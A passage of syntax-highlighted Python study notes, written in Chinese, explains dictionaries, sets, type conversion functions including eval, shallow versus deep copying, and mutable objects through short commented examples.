4)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#字典</span></span><br><span class="line"><span class="comment">#格式： dic=&#123;&#x27;name&#x27;:&#x27;my3171&#x27;,&#x27;age&#x27;:&#x27;18&#x27;&#125;     </span></span><br><span class="line"><span class="comment">#通过键值对的形式进行保存，键和值之间用冒号隔开，键值对之间用逗号隔开，</span></span><br><span class="line"><span class="comment">#键具有唯一性，但值可以重复</span></span><br><span class="line"><span class="comment">#格式： 字典名=&#123;键1:值1,键2:值2,键3:值3，键4:值4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;:&#x27;my3171&#x27;,&#x27;age&#x27;:&#x27;18&#x27;&#125;</span></span><br><span class="line"><span class="string">print(type(dic))    # &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#键名具有唯一性，如果键名重复，不会报错，但前面的值会被后面的值覆盖</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;:&quot;111&quot;,&quot;name&quot;:&quot;222&quot;&#125;</span></span><br><span class="line"><span class="string">print(dic)  # 输出&#123;&#x27;name&#x27;: &#x27;222&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#【字典的常见操作】</span></span><br><span class="line"><span class="comment">#1.查找元素(字典中没有下标，查找元素需要根据键名！！！！)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.      变量名[键名]        若键名不存在则报错</span></span><br><span class="line"><span class="string">2.      变量名.get(键名)    若键名不存在则返回None,或者自定义返回内容</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;:3171,&#x27;age&#x27;:18&#125;</span></span><br><span class="line"><span class="string">print(dic[&#x27;age&#x27;])   #输出 18</span></span><br><span class="line"><span class="string">print(dic.get(&#x27;name&#x27;))  #输出 3171</span></span><br><span class="line"><span class="string">print(dic.get(&#x27;haha&#x27;))  #输出 None</span></span><br><span class="line"><span class="string">print(dic.get(&#x27;haha&#x27;,&#x27;不存在&#x27;)) #输出 不存在</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.修改元素(字典通过键名修改)</span></span><br><span class="line"><span class="comment">#格式： 变量名[键名]=值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;:3171,&#x27;age&#x27;:18&#125;</span></span><br><span class="line"><span class="string">dic[&#x27;age&#x27;]=20</span></span><br><span class="line"><span class="string">print(dic)  #输出 &#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 20&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.添加元素</span></span><br><span class="line"><span class="comment">#格式： 变量名[键名]=值     （注意：键名存在就修改，不存在就新增！！！！）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;:3171,&#x27;age&#x27;:18&#125;</span></span><br><span class="line"><span class="string">dic[&#x27;tel&#x27;]=&#x27;1333333&#x27;</span></span><br><span class="line"><span class="string">print(dic)  #输出 &#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18, &#x27;tel&#x27;: &#x27;1333333&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.删除元素</span></span><br><span class="line"><span class="comment"># del</span></span><br><span class="line"><span class="comment"># 删除整个字典： del 字典名</span></span><br><span class="line"><span class="comment"># 删除指定的键值对，键名不存在就会报错：   del 字典名[键名]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18, &#x27;tel&#x27;: &#x27;1333333&#x27;&#125;</span></span><br><span class="line"><span class="string">del dic[&#x27;tel&#x27;]</span></span><br><span class="line"><span class="string">print(dic)  #输出 &#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear 清空整个字典里的内容，但保留这个字典</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18, &#x27;tel&#x27;: &#x27;1333333&#x27;&#125;</span></span><br><span class="line"><span class="string">dic.clear()</span></span><br><span class="line"><span class="string">print(dic)  #输出 &#123;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop 删除指定键值对，键不存在就会报错，不写键名也报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18, &#x27;tel&#x27;: &#x27;1333333&#x27;&#125;</span></span><br><span class="line"><span class="string">dic.pop(&#x27;tel&#x27;)</span></span><br><span class="line"><span class="string">print(dic)  #输出 &#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># popitem() 3.7之前的版本是随机删除一个键值对，3.7之后是默认删除最后一个键值对</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典常见操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求长度    len()</span></span><br><span class="line"><span class="comment"># 返回字典里面包含的所有键名    keys()</span></span><br><span class="line"><span class="comment"># 返回字典里面包含的所有值    values()</span></span><br><span class="line"><span class="comment"># 返回字典里面包含的所有键值对(元组形式)    items()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dic=&#123;&#x27;name&#x27;: 3171, &#x27;age&#x27;: 18, &#x27;tel&#x27;: &#x27;1333333&#x27;&#125;</span></span><br><span class="line"><span class="string">print(len(dic))     # 输出 3    （字典中有3个键值对）</span></span><br><span class="line"><span class="string">print(dic.keys())   # 输出 dict_keys([&#x27;name&#x27;, &#x27;age&#x27;, &#x27;tel&#x27;])</span></span><br><span class="line"><span class="string">print(dic.values()) # 输出 dict_values([3171, 18, &#x27;1333333&#x27;])</span></span><br><span class="line"><span class="string">print(dic.items())  # 输出 dict_items([(&#x27;name&#x27;, 3171), (&#x27;age&#x27;, 18), (&#x27;tel&#x27;, &#x27;1333333&#x27;)])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in dic.keys():</span></span><br><span class="line"><span class="string">    print(i)        #只取出键名</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name</span></span><br><span class="line"><span class="string">age</span></span><br><span class="line"><span class="string">tel</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in dic.values():</span></span><br><span class="line"><span class="string">    print(i)        #只取出值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3171</span></span><br><span class="line"><span class="string">18</span></span><br><span class="line"><span class="string">1333333</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in dic.items():</span></span><br><span class="line"><span class="string">    print(i)        #取出键值对(元组形式)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(&#x27;name&#x27;, 3171)</span></span><br><span class="line"><span class="string">(&#x27;age&#x27;, 18)</span></span><br><span class="line"><span class="string">(&#x27;tel&#x27;, &#x27;1333333&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 集合</span></span><br><span class="line"><span class="comment"># 格式：    s=&#123;1,2,3&#125;</span></span><br><span class="line"><span class="comment"># 注意：    1. 集合是无序的，里面的元素是唯一的     2. 可以用于元组或列表去重</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#123;1,2,3&#125;</span></span><br><span class="line"><span class="string">print(type(s))      # 输出 &lt;class &#x27;set&#x27;&gt;</span></span><br><span class="line"><span class="string">print(s)            # 输出 &#123;1, 2, 3&#125;</span></span><br><span class="line"><span class="string"># 注意： s=&#123;&#125;是定义空字典，如果要定义空集合，则用：     s=set()</span></span><br><span class="line"><span class="string">s=set()</span></span><br><span class="line"><span class="string">print(type(s))      # 输出 &lt;class &#x27;set&#x27;&gt;</span></span><br><span class="line"><span class="string">#集合具有无序性：</span></span><br><span class="line"><span class="string">s1=&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;&#125;</span></span><br><span class="line"><span class="string">s2=&#123;1,2,3,4,5,6&#125;</span></span><br><span class="line"><span class="string">print(s1)  #每次运行结果都不同</span></span><br><span class="line"><span class="string">print(s2)   #每次运行结果相同，都是&#123;1, 2, 3, 4, 5, 6&#125;</span></span><br><span class="line"><span class="string">#出现这种现象的原因是    集合元素无序性的实现方式涉及到hash表</span></span><br><span class="line"><span class="string">print(hash(&#x27;a&#x27;)) #每次运行结果都不同，哈希值不同，在哈希表中的位置不同，这就实现了集合的无序性</span></span><br><span class="line"><span class="string">print(hash(1)) #每次运行结果都是1，python中int整形的哈希值就是它本身，在哈希表中的位置不会发生变换</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 无序性：不能修改集合中的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#集合具有唯一性，可以自动去重</span></span><br><span class="line"><span class="string">s=&#123;1,2,1,3,4,4,5,2&#125;</span></span><br><span class="line"><span class="string">print(s) #输出 &#123;1, 2, 3, 4, 5&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#集合常见操作：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add()   添加的是一个整体</span></span><br><span class="line"><span class="string">update()    把传入的元素拆分，个个放入集合中</span></span><br><span class="line"><span class="string">remove()    选择数字有就删除，没有就报错</span></span><br><span class="line"><span class="string">pop()   进行无序排列，然后将左边第一个元素删除</span></span><br><span class="line"><span class="string">discard()   选择元素删除，没有不进行任何操作</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 添加的是一个整体</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s2=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">print(&quot;原集合：&quot;,s2)</span></span><br><span class="line"><span class="string">s2.add(5)</span></span><br><span class="line"><span class="string">print(&quot;现集合：&quot;,s2)</span></span><br><span class="line"><span class="string"># 注意：由于集合具有唯一性，如果需要添加的元素在原集合中已经存在，就不会进行任何操作</span></span><br><span class="line"><span class="string">s2.add(1)</span></span><br><span class="line"><span class="string">print(s2)  #输出&#123;1, 2, 3, 4, 5&#125; 并没有多添加一个1</span></span><br><span class="line"><span class="string"># 注意：一次只能添加一个元素</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># update 把传入的元素拆分，个个放入集合中</span></span><br><span class="line"><span class="comment"># update 里面只能放入能被for循环取值的可迭代对象（字符串，列表，元组）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s2=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">s2.update(&#x27;567&#x27;)</span></span><br><span class="line"><span class="string">print(s2)  # &#123;1, 2, 3, 4, &#x27;5&#x27;, &#x27;7&#x27;, &#x27;6&#x27;&#125;</span></span><br><span class="line"><span class="string">s2.update([7,8,9])</span></span><br><span class="line"><span class="string">print(s2)  # &#123;1, 2, 3, 4, &#x27;5&#x27;, 7, &#x27;6&#x27;, 8, 9, &#x27;7&#x27;&#125;</span></span><br><span class="line"><span class="string">s2.update((33,44,55,66))</span></span><br><span class="line"><span class="string">print(s2)  # &#123;&#x27;5&#x27;, 1, 2, 3, 4, 33, 66, 7, 8, 9, 44, &#x27;6&#x27;, 55, &#x27;7&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove 选择删除的元素，如果集合中有就删除，没有则报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">s.remove(3)</span></span><br><span class="line"><span class="string">print(s) # &#123;1, 2, 4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop 里面不需要填任何东西，默认直接是删除集合根据哈希表排序后的第一个元素</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#123;1,2,3,4&#125; # 数字是有序的，删除第一个，字符串无序……</span></span><br><span class="line"><span class="string">s.pop()</span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># discard 选择要删除的元素，有就会删除，没有则不会进行任何操作(区分remove)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">print(&quot;原集合：&quot;,s)</span></span><br><span class="line"><span class="string">s.discard(3)</span></span><br><span class="line"><span class="string">print(s) # &#123;1, 2, 4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交集，并集</span></span><br><span class="line"><span class="comment"># 交集 &amp;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s1=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">s2=&#123;3,4,5,6&#125;</span></span><br><span class="line"><span class="string">print(s1 &amp; s2)  # &#123;3, 4&#125;</span></span><br><span class="line"><span class="string"># 若没有交集，返回的是空集合 set()</span></span><br><span class="line"><span class="string">s3=&#123;&#x27;a&#x27;,&#x27;v&#x27;,&#x27;t&#x27;&#125;</span></span><br><span class="line"><span class="string">s4=&#123;&#x27;a&#x27;,&#x27;p&#x27;,&#x27;t&#x27;&#125;</span></span><br><span class="line"><span class="string">print(s3 &amp; s4) # &#123;&#x27;a&#x27;, &#x27;t&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并集 |</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a1=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">a2=&#123;5,6,7,8&#125;</span></span><br><span class="line"><span class="string">print(a1 | a2) # &#123;1, 2, 3, 4, 5, 6, 7, 8&#125;</span></span><br><span class="line"><span class="string"># 由于集合的唯一性，所以重复的元素不会多出</span></span><br><span class="line"><span class="string">s3=&#123;1,2,3,4&#125;</span></span><br><span class="line"><span class="string">s4=&#123;3,4,7,8&#125;</span></span><br><span class="line"><span class="string">print(s3 | s4) # &#123;1, 2, 3, 4, 7, 8&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类型转换</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">常用的类型转换语句：</span></span><br><span class="line"><span class="string">int(x)      将x转换成一个整数</span></span><br><span class="line"><span class="string">float(x)    将x转换成一个浮点数</span></span><br><span class="line"><span class="string">str(x)      将对象x转换成字符串</span></span><br><span class="line"><span class="string">eval(str)   用来计算在字符串中的有效python表达式，并返回一个对象</span></span><br><span class="line"><span class="string">tuple(s)    将序列s转换成一个元组</span></span><br><span class="line"><span class="string">list(s)     将序列s转换成一个列表</span></span><br><span class="line"><span class="string">chr(x)      将一个整数转换成一个字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># int()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 1.强制转换数字类型，将纯数字组成的字符串转换成整形数字，如果字符串中有数字和正负号以外的字符，则会报错</span></span><br><span class="line"><span class="string">s=&#x27;1&#x27;</span></span><br><span class="line"><span class="string">print(type(s))          # &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">print(type(int(s)))     # &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="string"># 2.浮点型转整形(会丢失小数点后的部分，只保留整数部分)</span></span><br><span class="line"><span class="string">s=12.5</span></span><br><span class="line"><span class="string">print(type(s))          # &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="string">print(type(int(s)))     # &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="string">print(int(s))           # 12</span></span><br><span class="line"><span class="string">s=0.1</span></span><br><span class="line"><span class="string">print(type(s),type(int(s)),s,int(s))    # &lt;class &#x27;float&#x27;&gt; &lt;class &#x27;int&#x27;&gt; 0.1 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># float()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 整形转换成浮点型，会自动添加一位小数,如果字符串中有数字,小数点和正负号以外的字符，则会报错</span></span><br><span class="line"><span class="string">print(float(11))    # 11.0</span></span><br><span class="line"><span class="string">print(float(-11))   # -11.0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># str()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 将对象转换成字符串类型，任何类型都可以转换成字符串类型！</span></span><br><span class="line"><span class="string">print(str(100),type(str(100)))  # 100 &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">print(str([1,2,3]),type(str([1,2,3])))  # [1, 2, 3] &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string"># 注意：浮点型转换成字符串型会去除末位为0的小数部分</span></span><br><span class="line"><span class="string">print(str(11.30))   # 11.3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># eval()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 用来计算在字符串中的有效python表达式，并返回一个对象</span></span><br><span class="line"><span class="string">print(eval(&quot;10+10&quot;))    # 20</span></span><br><span class="line"><span class="string">eval(&quot;print(&#x27;111&#x27;)&quot;)    # 111</span></span><br><span class="line"><span class="string"># 注意：eval只能用于计算单行表达式，如果需要多行，应该用 exec()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># eval 可以实现list,dict,tuple,str之间的转换</span></span><br><span class="line"><span class="string">s=&quot;[[1,2],[3,4],[5,6]]&quot;</span></span><br><span class="line"><span class="string">print(s,type(s))        # [[1,2],[3,4],[5,6]] &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">s1=eval(s)</span></span><br><span class="line"><span class="string">print(s1,type(s1))      # [[1, 2], [3, 4], [5, 6]] &lt;class &#x27;list&#x27;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a1=&quot;&#123;&#x27;name&#x27;:&#x27;bing&#x27;,&#x27;age&#x27;:18&#125;&quot;</span></span><br><span class="line"><span class="string">print(a1,type(a1))</span></span><br><span class="line"><span class="string">a2=eval(a1)             # &#123;&#x27;name&#x27;:&#x27;bing&#x27;,&#x27;age&#x27;:18&#125; &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">print(a2,type(a2))      # &#123;&#x27;name&#x27;: &#x27;bing&#x27;, &#x27;age&#x27;: 18&#125; &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 注意：eval 非常强大，但是不够安全，容易被恶意修改</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># list() 将可迭代对象转换成列表，不是则报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 支持转换成list的类型：str,tuple,dict,set</span></span><br><span class="line"><span class="string">print(list(&quot;abcde&quot;))    # [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span></span><br><span class="line"><span class="string">print(list((1,2,3,4)))  # [1, 2, 3, 4]</span></span><br><span class="line"><span class="string">print(list(&#123;&#x27;name&#x27;:&#x27;bing&#x27;,&#x27;age&#x27;:18&#125;))   # [&#x27;name&#x27;, &#x27;age&#x27;]</span></span><br><span class="line"><span class="string"># 注意：字典转列表，只取键名</span></span><br><span class="line"><span class="string">print(list(&#123;1,2,3,4&#125;))  # [1, 2, 3, 4]</span></span><br><span class="line"><span class="string">print(list(&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;c&#x27;&#125;))  # [&#x27;a&#x27;, &#x27;c&#x27;, &#x27;b&#x27;]</span></span><br><span class="line"><span class="string"># 注意：集合转列表，先去重，字符串也是随机性的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 深浅拷贝————只针对可变对象！！！！！！！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 深拷贝：外层对象和内部元素都拷贝了一遍</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋值（数据完全共享）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 会随着原对象一起变量</span></span><br><span class="line"><span class="string">li=[1,2,3,4]</span></span><br><span class="line"><span class="string">print(li)</span></span><br><span class="line"><span class="string">li2=li  # 直接将li赋值给li2</span></span><br><span class="line"><span class="string">print(li,li2)   # [1, 2, 3, 4] [1, 2, 3, 4]</span></span><br><span class="line"><span class="string">li.append(6)</span></span><br><span class="line"><span class="string">print(li,li2)   # [1, 2, 3, 4, 6] [1, 2, 3, 4, 6]</span></span><br><span class="line"><span class="string"># 发现两个列表都发生了变化！！</span></span><br><span class="line"><span class="string"># 赋值相等于完全共享资源，一个值的改变会完全被另一个值共享</span></span><br><span class="line"><span class="string">print(&quot;li内存地址：&quot;,id(li))</span></span><br><span class="line"><span class="string">print(&quot;li2内存地址：&quot;,id(li2))</span></span><br><span class="line"><span class="string"># 发现内存地址相同！！！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浅拷贝（数据半共享）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 会创建新的对象，拷贝第一层的数据，嵌套层会指向原来的内存地址！</span></span><br><span class="line"><span class="string">import copy # 导入copy模块</span></span><br><span class="line"><span class="string">li=[1,2,3,[4,5,6]]</span></span><br><span class="line"><span class="string">li2=copy.copy(li)</span></span><br><span class="line"><span class="string">print(li)   # [1, 2, 3, [4, 5, 6]]</span></span><br><span class="line"><span class="string">print(li2)  # [1, 2, 3, [4, 5, 6]]</span></span><br><span class="line"><span class="string">print(&quot;li内存地址：&quot;,id(li))</span></span><br><span class="line"><span class="string">print(&quot;li2内存地址：&quot;,id(li2))</span></span><br><span class="line"><span class="string"># 发现内存地址不同！！！</span></span><br><span class="line"><span class="string">li.append(8)</span></span><br><span class="line"><span class="string">print(li)   # [1, 2, 3, [4, 5, 6], 8]</span></span><br><span class="line"><span class="string">print(li2)  # [1, 2, 3, [4, 5, 6]]</span></span><br><span class="line"><span class="string"># 此时一个值改变不会共享到另一个</span></span><br><span class="line"><span class="string">#----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string"># 往嵌套列表里添加元素↓</span></span><br><span class="line"><span class="string">li[3].append(7)</span></span><br><span class="line"><span class="string">print(li)   # [1, 2, 3, [4, 5, 6, 7], 8]</span></span><br><span class="line"><span class="string">print(li2)  # [1, 2, 3, [4, 5, 6, 7]]</span></span><br><span class="line"><span class="string"># 发现两个列表中的嵌套列表都添加了7这个元素！！</span></span><br><span class="line"><span class="string"># 这是因为两个列表中的嵌套列表的内存地址是一样的！↓</span></span><br><span class="line"><span class="string">print(&quot;li[3]内存地址：&quot;,id(li[3]))</span></span><br><span class="line"><span class="string">print(&quot;li2[3]内存地址：&quot;,id(li2[3]))</span></span><br><span class="line"><span class="string"># 内存地址相同！！</span></span><br><span class="line"><span class="string"># 外层的内存地址不同，但是内层的内存地址相同！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 优点：拷贝速度快，占用空间小，效率高</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 深拷贝（数据完全不共享）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 外层对象和内部元素都拷贝了一遍</span></span><br><span class="line"><span class="string">import copy #导入copy模块</span></span><br><span class="line"><span class="string">li=[1,2,3,[4,5,6],7]</span></span><br><span class="line"><span class="string">li2=copy.deepcopy(li)</span></span><br><span class="line"><span class="string">print(li)   # [1, 2, 3, [4, 5, 6], 7]</span></span><br><span class="line"><span class="string">print(li2)  # [1, 2, 3, [4, 5, 6], 7]</span></span><br><span class="line"><span class="string">print(id(li))</span></span><br><span class="line"><span class="string">print(id(li2))</span></span><br><span class="line"><span class="string"># 内存地址不同！！</span></span><br><span class="line"><span class="string">li.append(9)</span></span><br><span class="line"><span class="string">print(li)   # [1, 2, 3, [4, 5, 6], 7, 9]</span></span><br><span class="line"><span class="string">print(li2)  # [1, 2, 3, [4, 5, 6], 7]</span></span><br><span class="line"><span class="string"># 外层数据不共享！</span></span><br><span class="line"><span class="string">li[3].append(8)</span></span><br><span class="line"><span class="string">print(li)   # [1, 2, 3, [4, 5, 6, 8], 7, 9]</span></span><br><span class="line"><span class="string">print(li2)  # [1, 2, 3, [4, 5, 6], 7]</span></span><br><span class="line"><span class="string"># 内层数据也不共享！！</span></span><br><span class="line"><span class="string">print(id(li[3]))</span></span><br><span class="line"><span class="string">print(id(li2[3]))</span></span><br><span class="line"><span class="string"># 内存地址不同！！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 深拷贝数据变化只影响自己本身，跟原来的对象没有了任何关系！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可变对象（存储空间保存的数据允许被修改）（list,dict,set)</span></span><br><span class="line"><span class="comment"># 变量对应的值可以被修改，但是内存地址不会发生改变！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,4]</span></span><br><span class="line"><span class="string">print(id(li))</span></span><br><span class="line"><span class="string">li.append(5)</span></span><br><span class="line"><span class="string">print(id(li))</span></span><br><span class="line"><span class="string"># 内存地址没有改变！！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不可变对象（存储空间保存的数据不允许被修改）（int,bool,float,complex,str,tuple)</span></span><br><span class="line"><span class="comment"># 